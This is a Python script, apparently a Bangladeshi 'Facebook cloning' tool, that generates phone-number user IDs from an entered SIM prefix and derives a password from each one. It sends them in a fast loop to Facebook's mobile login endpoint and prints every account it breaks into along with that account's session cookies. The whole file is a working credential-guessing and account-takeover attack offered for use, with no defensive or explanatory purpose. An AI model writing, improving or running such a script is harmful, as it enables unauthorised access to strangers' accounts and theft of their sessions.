import os, time, sys, uuid, random, requests

# ANSI কালার কোড
R = '\033[1;31m' 
G = '\033[1;32m' 
W = '\033[1;37m' 

def banner():
    os.system('clear')
    print(f"""
{R}     ███    ███  ███████  ████████  █████  
{G}     ████  ████  ██          ██    ██   ██ 
{W}     ██ ████ ██  █████       ██    ███████ 
{G}     ██  ██  ██  ██          ██    ██   ██ 
{R}     ██      ██  ███████     ██    ██   ██ 
    """)
    line = f"{G}×××××××××××××××××××××××××××××××××××××××××××××××××{W}"
    print(line)
    print(f'{G}| [✓] DEVELOPED BY : MD MALEK ISLAM            |')
    print(f'| [✓] TOOL STATUS  : REAL CLONING (HIGH SPEED) |')
    print(line)

def cloning_start():
    banner()
    code = input(f'{G}[+] ENTER SIM CODE : {W}')
    limit = int(input(f'{G}[+] ENTER CLONING LIMIT : {W}'))
    
    print(f'\n{G}[/] ATTACK STARTED ON CODE {code}...')
    print(f'[/] TOTAL TARGET : {limit}\n')

    ok = 0
    cp = 0

    for i in range(limit):
        loop = i + 1
        uid = f"{code}{random.randint(1111111, 9999999)}"
        pws = uid[5:] # ৬ সংখ্যার পাসওয়ার্ড

        headers = {
            'authority': 'touch.facebook.com',
            'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
            'accept': '*/*',
            'content-type': 'application/x-www-form-urlencoded',
        }

        data = {'email': uid, 'pass': pws}
        url = "https://touch.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100"
        
        # আপনার স্ক্রিনশট অনুযায়ী লাইভ কাউন্টার
        sys.stdout.write(f'\r{G}[MALEK-RUNNING] {loop}/{limit} [OK:{ok}] [CP:{cp}]'); sys.stdout.flush()

        try:
            # রিয়াল লগইন লজিক
            response = requests.post(url, headers=headers, data=data)
            
            if "c_user" in response.cookies.get_dict():
                ok += 1
                print(f'\n{G}[MALEK-OK💚] {uid} • {pws}') 
                print(f'{G}[🌺] COOKIE = {response.cookies.get_dict()}\n')
            else:
                cp += 1
        except:
            pass

        # স্পিড বাড়ানোর জন্য বিরতি কমিয়ে ০.০১ সেকেন্ড করা হয়েছে
        time.sleep(0.01)

    print(f'\n\n{G}[PROCESS COMPLETED]')
    print(f'[{limit}] [OK:{ok}]{W}')
    input(f'\n{G} [ BACK ]{W}')

if __name__ == "__main__":
    cloning_start()
